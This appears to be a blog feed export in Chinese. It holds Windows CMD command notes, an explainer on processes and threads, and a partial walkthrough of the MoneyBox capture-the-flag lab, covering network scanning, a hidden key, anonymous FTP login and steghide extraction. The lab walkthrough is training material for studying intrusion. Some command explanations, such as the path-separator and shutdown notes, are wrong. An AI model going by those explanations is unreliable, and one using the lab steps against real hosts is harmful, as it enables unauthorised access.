src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704629638602-6a70c7d1-2446-4d2d-8346-7d218b4bf81b.png" alt="image.png"><br>结果:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704629752608-41bb862f-89f8-4f78-b479-ac3e9ef269d8.png" alt="image.png"><br>通过标题和状态码进行简单的筛选然后导出：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704630021770-06d14431-a43a-4265-b496-bceacd653c58.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 企查查,域名解析,小米范 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows常见命令</title>
      <link href="/2024/01/08/windows%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/"/>
      <url>/2024/01/08/windows%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="1-cmd是什么？"><a href="#1-cmd是什么？" class="headerlink" title="1.cmd是什么？"></a>1.cmd是什么？</h1><p>CMD，全称 Command Prompt，是一种命令行界面，常见于Windows操作系统中。它提供了一个用户可以通过键入文本命令来与计算机进行交互的界面。通过CMD，用户可以执行各种系统命令和程序，进行文件和文件夹管理，以及进行系统设置等操作。CMD提供了一种比图形化界面更直接、更灵活的方式来操作计算机和执行任务。</p><h1 id="2-CMD基本命令："><a href="#2-CMD基本命令：" class="headerlink" title="2.CMD基本命令："></a>2.CMD基本命令：</h1><p>gpedit.msc—–组策略<br>services.msc—本地服务设置<br>explorer——-打开资源管理器<br>gpedit.msc—–组策略<br>sndrec32——-录音机#windows11没有这个<br>lusrmgr.msc—-本机用户和组<br>services.msc—本地服务设置<br>notepad——–打开记事本<br>cleanmgr——-垃圾整理<br>net start messenger—-开始信使服务#window11打不开这个服务<br>compmgmt.msc—打开1计算机管理<br>dvdplay——–DVD播放器<br>charmap——–启动字符映射表<br>diskmgmt.msc—磁盘管理实用程序<br>calc———–启动计算器<br>devmgmt.msc— 设备管理器<br>dxdiag———检查DirectX信息，诊断工具<br>DirectX诊断工具（也称为DXDiag）是Windows操作系统中的实用工具，用于诊断和检查计算机的DirectX相关信息。它可以帮助用户了解计算机的图形、音频和输入设备等DirectX相关信息，包括DirectX版本、驱动程序、显卡信息、音频设备信息等。可以通过DXDiag来检查DirectX的版本和功能，查看显卡和声卡信息，甚至进行一些简单的性能测试和故障排除。DXDiag工具通常用于检查计算机的图形和音频能力，以及解决与DirectX相关的问题。<br>regedt32——-注册表编辑器<br>Msconfig.exe—系统配置实用程序<br>rsop.msc——-组策略结果集<br>regedit.exe-—注册表等等</p><h1 id="3-windows命令行命令："><a href="#3-windows命令行命令：" class="headerlink" title="3.windows命令行命令："></a>3.windows命令行命令：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//进入d盘</span><br><span class="line">D:</span><br><span class="line">//进入F盘</span><br><span class="line">F:</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /?     //获取使用帮助</span><br><span class="line">cd \       //跳转到硬盘的根目录</span><br><span class="line">cd C:\WINDOWS  //跳转到当前硬盘的其他文件</span><br><span class="line">d:        //跳转到其他硬盘</span><br><span class="line">cd /d e:\software    //跳转到其他硬盘的其他文件夹，注意此处必须加/d参数。否则无法跳转。</span><br><span class="line">cd..      //跳转到上一层目录</span><br></pre></td></tr></table></figure><p>1.dir：<br>显示当前目录中的文件和文件夹列表。<br>用法：dir [目录路径]<br>示例：dir C:\Users，显示 Users 目录下的文件和文件夹列表。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704555427374-8c6a8b05-0c75-4a14-999a-da520f0683c8.png" alt="image.png"><br>2.cd：更改当前目录。<br>用法：cd [目录路径]<br>示例：cd C:\Windows\System32，切换到 System32 目录。<br>cd G：<br>G&#x2F;<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704555647277-e71cc67b-8bbc-43f4-89c3-741c9a1bf425.png" alt="image.png"><br>在 Windows 命令行中，执行 <code>cd G:</code> 命令会将当前目录切换到指定的驱动器。当你执行这个命令后，命令行窗口的提示符会从原来的路径更改为新驱动器的根目录。<br>‘&#x2F;‘ 符号在命令行中通常用作路径分隔符，用于指示目录层级关系。所以，当你在 Windows 命令行中看到 <code>G/</code>，实际上是在表示 G 驱动器的根目录。这是因为在 Windows 命令行中，使用 forward slash (&#x2F;) 来表示路径分隔符。<br>因此，即使你在命令行中输入的命令是 <code>cd G: </code>，但显示的结果是 <code>G/</code>，这只是命令行窗口中显示路径分隔符的方式不同，实际上已经成功切换到了 G 驱动器的根目录。如果你继续输入命令或执行其他操作，将会在 G 驱动器的根目录进行。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704555718338-ef1c6aa0-bcd7-48ca-81c2-2290b4ccedf7.png" alt="image.png"><br>3.md：只能创建新的文件夹。<br>用法：md [新文件夹名]<br>示例：md asd，在当前目录下创建新的文件夹 asd。<br>4.rd：删除空文件夹。<br>用法：rd [要删除的文件夹名]<br>示例：rd asd，删除当前目录下的文件夹 asd。</p><p>rd &#x2F;s &#x2F;q </p><p>md asd1<br>5.在 “G:\asd1” 目录下创建一个名为 “1.txt” 的文本文件：<br><strong>echo. &gt; “G:\asd1\1.txt”</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704556798824-21efceb9-b85a-432f-af29-7ed691fbcbf0.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 文本内容 &gt; 文件名.txt</span><br></pre></td></tr></table></figure><p>find：<br>用法：find “12” 文件名<br>示例：find “12” 1.txt<br>结果：这条命令将在 test.txt 中搜索包含 “12” 文本的行。<br>5.copy：复制文件或文件夹。<br>新建文件夹file<br>新建2.txt<br>echo. “G:\2.txt”<br>用法：copy [源文件路径] [目标文件路径]<br>示例：copy G:2.txt G:\file，将 2.txt 复制到 G:\file。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704556313927-913c6da5-04ac-4f0f-8f32-5e7de1de1908.png" alt="image.png"><br>6.xcopy：复制文件和文件夹，并可以选择性地包括子目录和文件。<br>用法：xcopy [源路径] [目标路径] &#x2F;s<br>示例：xcopy C:\Source D:\Destination &#x2F;s，将 C:\Source 中的内容复制到 D:\Destination。<br>结果：<br>每个文件的复制过程，包括源文件的名称和目标文件的名称。<br>被复制的文件数量以及复制成功的数量。<br>如果有文件未能被复制，它还会显示有关这些文件的信息，比如文件不存在或者访问权限不足等。<br>7.del：删除文件。<br>用法：del [文件名]<br>示例：del 1.txt，删除当前目录下的 1.txt 文件。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704556877597-55230bdd-8081-4dfc-9506-962f69feb260.png" alt="image.png"><br>8.ren：重命名文件或文件夹。<br>用法：ren [原文件名] [新文件名]<br>示例：ren file file1，将文件名 file 改为 file1。<br>echo. &gt;”G:\3.txt”<br>9.move：移动文件或文件夹到另一个位置。<br>用法：move [源路径] [目标路径]<br>示例：move 3.txt G:\file1，将文件 3.txt 移动到G:\file1 。<br>echo. &gt;”G:\4.txt”<br>10.type：显示文件内容。<br>用法：type [文件名]<br>示例：type 4.txt，显示 4.txt 文件的内容。<br>11.attrib：显示或更改文件的属性。<br>用法：attrib [+&#x2F;-][属性] [文件名]<br>示例：attrib +r 4.txt，将4.txt 设置为只读属性。<br>12.cls：清空命令行窗口。<br>用法：cls<br>示例：在命令提示符下直接输入 cls，清空当前窗口内容。<br>13.tasklist：显示正在运行的进程列表。<br>用法：tasklist<br>示例：在命令提示符下直接输入 tasklist，显示当前正在运行的进程列表。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704557877152-4ec40bb9-e8f9-42f4-9e32-2d8072fd71d8.png" alt="image.png"><br>14.taskkill：终止进程。<br>用法：taskkill &#x2F;F &#x2F;IM [进程名]#&#x2F;IM 参数用于指定要终止的进程的映像名称。映像名称是指运行的可执行文件的名称，通常是带有扩展名的文件名。<br>示例：taskkill &#x2F;F &#x2F;IM baidunetdisk.exe，强制关闭名为baidunetdisk.exe 的进程。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704558110641-bfb369f2-40fc-402b-8f2a-7642842a49d6.png" alt="image.png"><br>15.ipconfig：显示计算机的网络连接配置信息，包括 IP 地址、子网掩码、默认网关等。<br>用法：ipconfig<br>示例：在命令提示符下直接输入 ipconfig，显示当前网络适配器的 IP 配置信息。<br>16.ping：向指定的 IP 地址发送 ICMP 回显请求以测试网络连接。<br>用法：ping [目标地址]<br>示例：ping <a href="http://www.baidu.com,向/">www.baidu.com，向</a> <a href="http://www.baidu.com/">www.baidu.com</a> 发送 ICMP 请求。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704558524964-b75676f9-ff81-4fa4-9951-0d3e12cc023d.png" alt="image.png"><br>17.tracert：跟踪数据包在网络上的路由路径。<br>用法：tracert [目标地址]<br>示例：tracert <a href="http://www.baidu.com,跟踪访问/">www.baidu.com，跟踪访问</a> <a href="http://www.baidu.com/">www.baidu.com</a> 的网络路由路径。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704558996775-875c22b6-414e-400f-84db-a2907fcb8bed.png" alt="image.png"><br>当执行”tracert”命令时，它会在计算机和目标主机之间的路由上发送一系列的网络探测包（ICMP报文），以测量数据包到达目标主机所经过的中间节点的时间。如果在路由跟踪过程中某个节点上的数据包超过一定的时间限制（默认为1秒），则会显示”超时”。<br>“超时”可能有多种原因，包括网络拥堵、丢包、路由过程中的延迟以及某个节点对ICMP报文的阻止等。当遇到超时时，这意味着在该节点上可能存在网络问题或延迟，或者该节点丢弃了ICMP报文。超时并不一定表示有问题，尤其是在跨越国际边界或通过公共互联网时，超时是比较常见的。<br>如果在”tracert”结果中只有一两个节点显示超时，而后续节点显示正常，那么可能是在路由路径上的某个特定节点上出现了临时问题。但是，如果多个节点显示超时，或者超时延迟很高，并持续出现在整个路由跟踪过程中，那么可能存在网络连接或路由配置的问题。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704559293784-1d4d620a-740b-4f60-a8b3-52b831f9405b.png" alt="image.png"><br>18.netstat：显示当前处于活动状态的网络连接。<br>netstat -h:帮助命令<br>用法：netstat [-a] [-b] [-n] [-o]<br>示例：netstat -a，显示当前计算机的所有活动连接。<br>netstat -b 会显示正在使用连接的可执行程序的名称。<br>netstat -n 会以数字格式显示地址和端口号。<br>netstat -o 会显示与每个连接关联的进程的标识符。<br>19.chkdsk：检查磁盘的文件系统错误并修复。<br>用法：chkdsk [驱动器盘符] &#x2F;f<br>示例：chkdsk C: &#x2F;f，检查并修复 C 盘文件系统错误。#没有权限<br>20.format：格式化磁盘。<br>用法：format [驱动器盘符]: &#x2F;FS:文件系统类型<br>示例：format D: &#x2F;FS:NTFS，格式化 D 盘为 NTFS 文件系统。</p><p>21.shutdown [&#x2F;s][&#x2F;r][&#x2F;t xx][&#x2F;c “comment”][&#x2F;f][&#x2F;h][&#x2F;p]<br>示例：shutdown &#x2F;s &#x2F;t 0<br>结果：这条命令将立即关闭计算机(&#x2F;s)，不发送警告(&#x2F;f)，不显示详细信息(&#x2F;c “comment”)。</p><ul><li>&#x2F;s：关闭计算机。这将立即关闭计算机，用户将被注销。</li><li>&#x2F;r：重新启动计算机。这会导致计算机立即重新启动。</li><li>&#x2F;t xx：指定关机或重启前的等待时间（以秒为单位），其中 xx 表示等待的秒数。例如，&#x2F;t 60 表示在执行关机或重启操作前等待 60 秒。</li><li>&#x2F;c “comment”：指定关机或重启时的注释信息。可以添加一条注释，以便其他用户了解关机或重启的原因。</li><li>&#x2F;f：强制关闭应用程序。这将强制关闭当前正在运行的应用程序而不经过提示。</li><li>&#x2F;h：在支持的计算机上，将系统休眠（Hibernate）。</li><li>&#x2F;p：用在和 &#x2F;s 选项一起，将系统关闭而不需要用户登录。</li></ul><p>22.systeminfo：这条命令将列出系统的详细信息，如操作系统版本、安装日期、可用的物理内存等。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704559744341-2293e1d8-c690-4b44-bf13-d25fe2a99990.png" alt="image.png"><br>23.net：<br>用法：net [命令]<br>示例：net user<br>结果：这条命令将显示本地用户账户的信息。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704559781260-47110491-cd71-4f75-91c4-6b4e9b9cd236.png" alt="image.png"></p><p>24.assoc：<br>用法：assoc [.扩展名]<br>示例：assoc .exe<br>结果：这条命令将显示 .exe 文件扩展名关联的程序。<br>如果命令行输出为 “.exe&#x3D;exefile”，则表示 .exe 文件扩展名被关联到 “exefile” 这个文件类型。默认情况下，Windows 将 .exe 文件关联到可执行程序。<br>25.driverquery：<br>用法：driverquery<br>示例：driverquery<br>结果：这条命令将显示当前系统中安装的驱动程序列表。<br>26.schtasks：<br>schtasks 是 Windows 操作系统的命令行工具，用于管理计划任务（Scheduled Tasks）。计划任务是在指定的时间或事件触发时自动执行的操作、脚本或程序。<br>用法：schtasks [参数]<br>示例：schtasks &#x2F;query#列出系统中当前存在的所有计划任务，并显示它们的名称、计划时间、状态等信息。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704560214915-78285a32-a6e3-4c41-b4ef-7e852d6bd0b0.png" alt="image.png"><br>&#x2F;query：列出当前系统中的所有计划任务。<br>&#x2F;create：创建新的计划任务。<br><strong>schtasks &#x2F;create &#x2F;tn DailyScript &#x2F;tr C:\Scripts\run_daily_script.bat &#x2F;sc daily &#x2F;st 08:00</strong></p><ul><li>&#x2F;create 表示创建一个新的计划任务。</li><li>&#x2F;tn DailyScript 指定了任务的名称为 “DailyScript”。#TaskName</li><li>&#x2F;tr C:\Scripts\run_daily_script.bat 指定了任务要运行的程序或脚本的路径。</li><li>&#x2F;sc daily 指定了任务的触发类型为每天。#Schedule日程安排</li><li>&#x2F;st 08:00 指定了任务的开始时间为早上 8 点。</li></ul><p>&#x2F;delete：删除指定的计划任务。<br>用法：schtasks &#x2F;delete &#x2F;tn TaskName<br>&#x2F;run：立即运行指定的计划任务。<br>用法：schtasks &#x2F;run &#x2F;tn TaskName<br>&#x2F;end：停止正在运行的指定计划任务。<br>用法：schtasks &#x2F;end &#x2F;tn TaskName<br>&#x2F;change：修改指定的计划任务配置。<br>用法：schtasks &#x2F;change &#x2F;tn TaskName [options]<br>&#x2F;enable：启用指定的计划任务。<br>用法：schtasks &#x2F;enable &#x2F;tn TaskName<br>&#x2F;disable：禁用指定的计划任务。<br>用法：schtasks &#x2F;disable &#x2F;tn TaskName<br>&#x2F;queryschedules：按照计划时间查询计划任务。<br>用法：schtasks &#x2F;queryschedules &#x2F;tn TaskName<br>&#x2F;tn：指定要操作的计划任务的名称。<br>用法：schtasks &#x2F;command &#x2F;tn TaskName<br>&#x2F;ru：指定计划任务要运行的用户。<br>用法：schtasks &#x2F;create &#x2F;ru Username &#x2F;tn TaskName<br>&#x2F;rp：指定计划任务要运行的用户的密码。<br>用法：schtasks &#x2F;create &#x2F;rp Password &#x2F;tn TaskName</p>]]></content>
      
      
      <categories>
          
          <category> windows系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程与线程</title>
      <link href="/2024/01/08/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
      <url>/2024/01/08/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>​       一个进程能够调用一个或者多个线程，线程又可以调用cpu,cpu又有处理器和核。逻辑处理器就是我们所说的g。线程可以通过操作系统调度来在 CPU 的核心上执行。操作系统负责为线程分配 CPU 时间片，以及决定线程何时在哪个核心上运行。</p><p>​       当线程被创建时，操作系统会将其加入到可调度的线程队列中。在每个时钟周期或者特定的时间间隔，操作系统会根据调度算法从线程队列中选择一个线程，并将其在某个 CPU 核心上执行。这个过程被称为线程调度。</p><p>​       线程调度的目标是让 CPU 尽可能高效地利用，以实现并发执行。操作系统可以根据线程的优先级、等待时间、资源需求等因素来进行调度决策，以确保公平性、平衡性和高性能。</p><p>​       值得注意的是，线程的创建并不直接决定它会在哪个核心上执行，而是由操作系统决定。通过调度算法，操作系统会根据当前系统的状态和负载情况，以及线程的特性和需求，将线程分配给最合适的核心来执行。</p><p>​       也就是说进程和线程是 CPU 执行程序的实体，它们两个被操作系统调度和管理，通过与 CPU 的协作来完成计算任务。进程和线程的设计决定了程序的并发性和效率，而 CPU 的调度与执行则决定了程序的实际运行情况。因此，进程、线程和 CPU 之间共同协作，实现了程序的执行和系统的运行。</p><h1 id="1、线程的基本概念"><a href="#1、线程的基本概念" class="headerlink" title="1、线程的基本概念"></a>1、线程的基本概念</h1><h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p>线程是进程中执行运算的最小单位，是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自己不拥有系统资源，只拥有一点在运行中必不可少的资源，但它可与同属一个进程的其它线程共享进程所拥有的全部资源。一个线程可以创建和撤消另一个线程，同一进程中的多个线程之间可以并发执行。 </p><h2 id="好处-："><a href="#好处-：" class="headerlink" title="好处 ："></a>好处 ：</h2><p>（1）易于调度。 </p><p>（2）提高并发性。通过线程可方便有效地实现并发性。进程可创建多个线程来执行同一程序的不同部分。 </p><p>（3）开销少。创建线程比创建进程要快，所需开销很少。</p><p>（4）利于充分发挥多处理器的功能。通过创建多线程进程，每个线程在一个处理器上运行，从而实现应用程序的并发性，使每个处理器都得到充分运行。 </p><h1 id="2、进程的基本状态及状态之间的关系"><a href="#2、进程的基本状态及状态之间的关系" class="headerlink" title="2、进程的基本状态及状态之间的关系"></a>2、进程的基本状态及状态之间的关系</h1><h2 id="状态：运行、阻塞、挂起阻塞、就绪、挂起就绪"><a href="#状态：运行、阻塞、挂起阻塞、就绪、挂起就绪" class="headerlink" title="状态：运行、阻塞、挂起阻塞、就绪、挂起就绪"></a>状态：运行、阻塞、挂起阻塞、就绪、挂起就绪</h2><p>​       状态之间的转换：准备就绪的进程，被CPU调度执行，变成运行态； 运行中的进程，进行I&#x2F;O请求或者不能得到所请求的资源，变成阻塞态； 运行中的进程，进程执行完毕（或时间片已到），变成就绪态； 将阻塞态的进程挂起，变成挂起阻塞态，当导致进程阻塞的I&#x2F;O操作在用户重启进程前完成（称之为唤醒），挂起阻塞态变成挂起就绪态，当用户在I&#x2F;O操作结束之前重启进程，挂起阻塞态变成阻塞态； 将就绪（或运行）中的进程挂起，变成挂起就绪态，当该进程恢复之后，挂起就绪态变成就绪态； </p><h1 id="3、线程和进程的关系以及区别？"><a href="#3、线程和进程的关系以及区别？" class="headerlink" title="3、线程和进程的关系以及区别？"></a>3、线程和进程的关系以及区别？</h1><h2 id="进程和线程的关系："><a href="#进程和线程的关系：" class="headerlink" title="进程和线程的关系："></a>进程和线程的关系：</h2><p>（1）一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程。 （2）资源分配给进程，同一进程的所有线程共享该进程的所有资源。 </p><p>（3）处理机分给线程，即真正在处理机上运行的是线程。 </p><p>（4）线程在执行过程中，需要协作同步。不同进程的线程间要利用消息通信的办法实现同步。线程是指进程内的一个执行单元,也是进程内的可调度实体.。</p><h2 id="进程与线程的区别："><a href="#进程与线程的区别：" class="headerlink" title="进程与线程的区别："></a>进程与线程的区别：</h2><p>（1）调度：线程作为调度和分配的基本单位，进程作为拥有资源的基本单位 。</p><p>（2）并发性：不仅进程之间可以并发执行，同一个进程的多个线程之间也可并发执行 。</p><p>（3）拥有资源：进程是拥有资源的一个独立单位，线程不拥有系统资源，但可以访问隶属于进程的资源。</p><p>（4）系统开销：在创建或撤消进程时，由于系统都要为之分配和回收资源，导致系统的开销明显大于创建或撤消线程时的开销。 </p><h1 id="4、同步和互斥的区别："><a href="#4、同步和互斥的区别：" class="headerlink" title="4、同步和互斥的区别："></a>4、同步和互斥的区别：</h1><p>​       当有多个线程的时候，经常需要去同步这些线程以访问同一个数据或资源。例如，假设有一个程序，其中一个线程用于把文件读到内存，而另一个线程用于统计文件中的字符数。当然，在把整个文件调入内存之前，统计它的计数是没有意义的。但是，由于每个操作都有自己的线程，操作系统会把两个线程当作是互不相干的任务分别执行，这样就可能在没有把整个文件装入内存时统计字数。为解决此问题，你必须使两个线程同步工作。 </p><p>​       所谓同步，是指散步在不同进程之间的若干程序片断，它们的运行必须严格按照规定的某种先后次序来运行，这种先后次序依赖于要完成的特定的任务。如果用对资源的访问来定义的话，同步是指在互斥的基础上（大多数情况），通过其它机制实现访问者对资源的有序访问。在大多数情况下，同步已经实现了互斥，特别是所有写入资源的情况必定是互斥的。少数情况是指可以允许多个访问者同时访问资源。 </p><p>​       所谓互斥，是指散布在不同进程之间的若干程序片断，当某个进程运行其中一个程序片段时，其它进程就不能运行它们之中的任一程序片段，只能等到该进程运行完这个程序片段后才可以运行。如果用对资源的访问来定义的话，互斥某一资源同时只允许一个访问者对其进行访问，具有唯一性和排它性。但互斥无法限制访问者对资源的访问顺序，即访问是无序的。</p>]]></content>
      
      
      <categories>
          
          <category> 进程与线程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进程与线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MonkeyBox靶机通关教程</title>
      <link href="/2024/01/08/MonkeyBox%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/"/>
      <url>/2024/01/08/MonkeyBox%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一-环境搭建："><a href="#一-环境搭建：" class="headerlink" title="一.环境搭建："></a>一.环境搭建：</h1><h2 id="1-下载vitualbox："><a href="#1-下载vitualbox：" class="headerlink" title="1.下载vitualbox："></a>1.下载vitualbox：</h2><p>首先下载5.2.28版本的vitual box<br><a href="http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/ensp-3c/ensp3c%E7%89%88%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E5%8C%85/VirtualBox-5.2.28-130011-Win.exe">http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/ensp-3c/ensp3c%E7%89%88%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E5%8C%85/VirtualBox-5.2.28-130011-Win.exe</a><br>官网也行：<br><a href="https://www.virtualbox.org/">https://www.virtualbox.org/</a><br>首先要保证之前没有安装过vitual box，否则有可能会因为第一次卸载不是很完整，导致有残余的注册列表存留使得两个vitualbox发生冲突。</p><h2 id="2-之后下载monkeybox的虚拟机："><a href="#2-之后下载monkeybox的虚拟机：" class="headerlink" title="2.之后下载monkeybox的虚拟机："></a>2.之后下载monkeybox的虚拟机：</h2><p>下载完成之后进入vitual box<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704372582403-5bd26909-2f8e-4ca4-b6da-2bf41c4cab99.png" alt="image.png"><br>点击管理导入新的虚拟电脑，一直点击下一步就会出现上图的结果。<br>此时还只是关闭状态，首先右键进行设置，进入如图界面：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704372698155-34b84ef8-829e-496e-96d8-b7528df74936.png" alt="image.png"><br>USB设备选择1.1的控制器，网络选择仅主机模式找到VirtualBox Host-Only Ethernet Adapter #2<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704372931044-d359ec65-2aa6-424d-8d73-3d3ecc2bb961.png" alt="image.png"><br>这里点击高级，记录下物理地址：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">080027</span>FBFF86</span><br></pre></td></tr></table></figure><p>此时能够正常启动vitual box，之后对kalilinux虚拟机进行网络配置<br>首先进行整体配置：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704373648233-867e4c55-e25b-4e15-9d3f-039aadf4b372.png" alt="image.png"><br>之后对kali linux直接选择桥接模式就可以了，此时基本的环境已经搭建好了。</p><h1 id="二-获取第一个flag："><a href="#二-获取第一个flag：" class="headerlink" title="二.获取第一个flag："></a>二.获取第一个flag：</h1><h2 id="1-检查："><a href="#1-检查：" class="headerlink" title="1.检查："></a>1.检查：</h2><p>首先虽然环境配置已经完成了，但是还是需要查看自己的ip，命令是<strong>ifconfig</strong><br>发现一个问题：桥接的eth没有显示ip地址，当换成wifi的网卡时又会显示IP地址。此时由于没有ip无法进行下一步。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704374376561-2740e101-0e62-4892-b551-882681c720c2.png" alt="5e6311db662b8ae3e25143538a95b64.png"><br>这里就必须要想办法解决，否则没有ip，想出一种解决办法就是将MoneyBox和kali linux发在同一个网卡下且都是桥接模式。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704374713624-785f499d-9e65-4aa9-81fd-d53ffae9ddd0.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704374872568-b51f4903-fcc2-472d-915e-756dcc99099b.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704374842005-3feccab1-db5a-472e-b4b2-dc85642df0a7.png" alt="image.png"></p><h2 id="2-扫描主机："><a href="#2-扫描主机：" class="headerlink" title="2.扫描主机："></a>2.扫描主机：</h2><p>尝试通过arp的相关命令通过端口查找monkey box与之对应的IP地址。<br>命令为：<strong>arp-scan -l -I eth0 #通过arp来确定eth0的网段有哪些主机，也就是使用 arp-scan 应用程序扫描局域网中的设备，使用网络接口 eth0 进行扫描。</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704374951528-39863dc5-074d-4efa-92e1-de0453a7603b.png" alt="image.png"><br>还有一步需要进行操作对eth0的ip进行刷新：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ifdown eth0<span class="comment">#关闭网卡</span></span><br><span class="line">ifup eth0<span class="comment">#开启网卡</span></span><br></pre></td></tr></table></figure><p>**通过物理地址发现monkeybox的ip地址是192.168.2.24**<br>在火狐浏览器上面输入192.168.2.24，出现下图界面即为成功：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704375623665-fb518c26-80f5-4628-8cc9-5fb4f1b92ab8.png" alt="image.png"><br>通过nmap进行端口扫描：nmap -p 21,22,80 -sC 192.168.2.24#sC测试模块</p><h2 id="3-端口扫描："><a href="#3-端口扫描：" class="headerlink" title="3.端口扫描："></a>3.端口扫描：</h2><p>这个也可以用来扫描端口：nmap -sn 192.168.2.24<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704375172345-a1ca0f84-9966-4376-8e52-08216affb626.png" alt="image.png"><br>发现ftp下面存在一张图片，这个Anonymous有点可疑且任意用户可以登录ftp。</p><h2 id="4-目录扫描："><a href="#4-目录扫描：" class="headerlink" title="4.目录扫描："></a>4.目录扫描：</h2><p>发现个blogs的目录可以尝试：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704376457436-113e9280-8342-451a-8a9b-1d36d677fa45.png" alt="image.png"><br>在浏览器进行打开blogs，出现这个界面，发现没有什么太多线索。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704376904869-e1fe864c-df79-4374-8b10-b53bfedf34a9.png" alt="image.png"><br>直接查看源码：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704377007268-ffdbcfe1-67fb-4ba0-8d95-944102e5532b.png" alt="image.png"><br>发现这里有个注释掉的内容：<br>这个目录可以记录下：S3cr3t-T3xt，其实这是一个隐藏的目录，继续尝试一下：<br>在最后发现这里有个key：3xtr4ctd4t4<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704377278237-f4801e7f-3791-4a3c-9ed7-f0e1842d00f1.png" alt="image.png"><br>此时我们手上的信息就三个，一个用户名Anonymous，一个密码3xtr4ctd4t4，一个图片trytofind.jpg</p><h2 id="5-ftp登录："><a href="#5-ftp登录：" class="headerlink" title="5.ftp登录："></a>5.ftp登录：</h2><p>ftp 192.168.2.24之后输入用户名和密码<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704377663429-de99552a-bba8-4770-aa24-4d7426419351.png" alt="image.png"><br>出现ftp就登陆成功。help帮助一下，ls下面就一张图片，get获取一下。<br>**get trytofind.jpg **<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704377996084-0087e2f2-bc0a-4769-9696-c3fd52922300.png" alt="image.png"><br>图片是这个样子的：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704378052756-66fcef5b-863c-487b-85af-89b390f3c53e.png" alt="image.png"></p><h2 id="6-破解图片：二进制进行查看"><a href="#6-破解图片：二进制进行查看" class="headerlink" title="6.破解图片：二进制进行查看"></a>6.破解图片：二进制进行查看</h2><p>前提：退出ftp进行操作。<br><strong>strings trytofind.jpg</strong>#以二进制的形式查看图片的组成<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704378479832-b4df70ff-e35d-40d4-a314-2e5ff786b2dc.png" alt="image.png"><br>二进制解开之后发现比较混乱，说明另藏玄机。<br>用steghide进行验证一下，榨取图片中的文件并分离：<br><strong>steghide  extract -sf trytofind.jpg</strong><br>如果没有安装需要用apt install xxxx的形式进行安装<br>这里enter passphrase需要输入密码3xtr4ctd4t4<br><img 